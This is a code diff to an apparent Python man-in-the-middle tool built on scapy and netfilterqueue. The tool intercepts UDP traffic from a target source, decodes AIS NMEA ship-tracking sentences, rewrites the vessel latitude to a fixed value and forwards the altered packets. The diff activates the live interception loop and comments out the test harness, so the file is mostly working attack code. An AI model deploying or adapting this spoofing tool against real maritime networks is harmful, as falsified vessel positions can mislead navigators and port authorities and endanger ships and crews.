@@ -1,4 +1,3 @@
-import string
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
@@ -39,17 +38,17 @@ class MITM:
         pktIP = IP(pkt)
         
         #pktIP.show()
-        payload = pktIP.getlayer(UDP).payload.decode()
-        if pktIP.haslayer(UDP) and payload.startswith("!AIVDM") :
+        payload = pktIP.getlayer(UDP).payload
+        if pktIP.haslayer(UDP) and pktIP.src == self.src_ip:
             print(f"[*] Packet Intercepted with payload {payload}")
-            ais_data = AIS_NMEA(payload.encode())
+            ais_data = AIS_NMEA(bytes(payload))
 
             print(f"[*] Decoded: {ais_data.decoded_dict}")
             old_len = len(pktIP[UDP].payload)
             pktIP[UDP].remove_payload()
 
             ais_data.alter_field('lat', 48.475577)
-            pktIP[UDP].add_payload(ais_data.modified_sentence)
+            pktIP[UDP].add_payload(ais_data.modified_sentence[0])
 
             new_len = len(pktIP[UDP].payload)
             pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
@@ -58,7 +57,7 @@ class MITM:
             del pktIP[UDP].len
             #pktIP.show2()
             pkt = pktIP.__class__(bytes(pktIP))
-            packet.set_payload(pkt)
+            packet.set_payload(bytes(pkt))
 
         packet.accept()
 
@@ -143,23 +142,24 @@ def get_input():
 
 
 if __name__ == '__main__':
-    ais_nmea = AIS_NMEA(b"!AIVDM,1,1,,A,13HOI:0P0000VOHLCnHQKwvL05Ip,0*23")
-    print(ais_nmea.sentence)
-    print(ais_nmea.decoded_dict)
-    ais_nmea.alter_field('lat', 48.475577)
-    print(ais_nmea.modified_sentence)
-    print(ais_nmea.ais_dict)
+    # ais_nmea = AIS_NMEA(b"!AIVDM,1,1,,A,13HOI:0P0000VOHLCnHQKwvL05Ip,0*23")
+    # print(ais_nmea.sentence)
+    # print(ais_nmea.decoded_dict)
+    # ais_nmea.alter_field('lat', 48.475577)
+    # print(bytes(ais_nmea.modified_sentence[0][0]))
+    # print(type(ais_nmea.modified_sentence))
+    # print(ais_nmea.ais_dict)
 
-    # args = get_input()
+    args = get_input()
 
-    # mitm = MITM(args.target_ip, args.source_ip, args.interface)
-    # mitm.setup()
-    # mitm.start_mitm()
+    mitm = MITM(args.target_ip, args.source_ip, args.interface)
+    mitm.setup()
+    mitm.start_mitm()
 
-    # try:
-    #     print("[*] waiting for data")
-    #     mitm.nfqueue.run()
-    # except KeyboardInterrupt:
-    #     mitm.stop_mitm()
+    try:
+        print("[*] waiting for data")
+        mitm.nfqueue.run()
+    except KeyboardInterrupt:
+        mitm.stop_mitm()
 
-    # mitm.nfqueue.unbind()
+    mitm.nfqueue.unbind()
